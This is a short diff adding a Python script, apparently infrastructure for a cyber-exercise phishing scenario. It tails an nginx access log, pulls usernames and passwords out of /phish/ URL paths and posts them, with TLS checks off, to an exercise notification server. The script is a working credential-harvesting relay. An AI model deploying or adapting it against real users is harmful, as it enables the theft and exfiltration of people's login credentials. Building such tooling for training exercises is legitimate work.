@@ -1,0 +1,35 @@
+#!/usr/bin/python3
+import time
+import re
+import requests
+import json
+
+log_file = "/var/log/nginx/access.log"
+url = "https://{{ global_exercise.auth_url }}/api/notifications/ingame"
+
+
+def check_for_404_errors():
+    with open(log_file, "r") as f:
+        f.seek(0, 2)  # Move the file pointer to the end of the file
+        while True:
+            line = f.readline()
+            if " 404 " in line:
+                pattern = r"GET /phish/(.*?)/(.*?) HTTP"
+                match = re.search(pattern, line)
+
+                if match:
+                    username = match.group(1)
+                    password = match.group(2)
+                    data = json.dumps(
+                        { "message": f"<h3>Phishing</h3><br>username: {username}, password: {password}" }
+                    )
+                    headers = { "Content-Type": "application/json" }
+                    requests.post(url, data=data, headers=headers, verify=False)
+
+                print(line.strip())
+
+
+if __name__ == "__main__":
+    while True:
+        check_for_404_errors()
+        time.sleep(1)
